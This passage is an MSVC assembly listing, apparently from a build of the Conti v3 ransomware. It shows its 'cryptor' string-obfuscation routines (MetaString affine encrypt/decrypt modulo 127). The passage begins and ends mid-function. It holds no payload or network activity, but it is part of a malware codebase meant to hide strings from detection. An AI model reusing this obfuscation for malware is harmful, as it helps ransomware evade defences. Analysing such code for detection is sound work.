_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 34 00 00 00	 mov	 ecx, 52			; 00000034H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 34	 add	 r8d, 52			; 00000034H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 63	 sub	 eax, 99			; 00000063H
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 63	 add	 r8d, 99			; 00000063H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 30	 add	 r8d, 48			; 00000030H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 6d	 sub	 eax, 109		; 0000006dH
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6d	 add	 r8d, 109		; 0000006dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 72 00 00 00	 mov	 ecx, 114		; 00000072H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 06	 add	 eax, 6
  00006	44 6b c0 13	 imul	 r8d, eax, 19
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
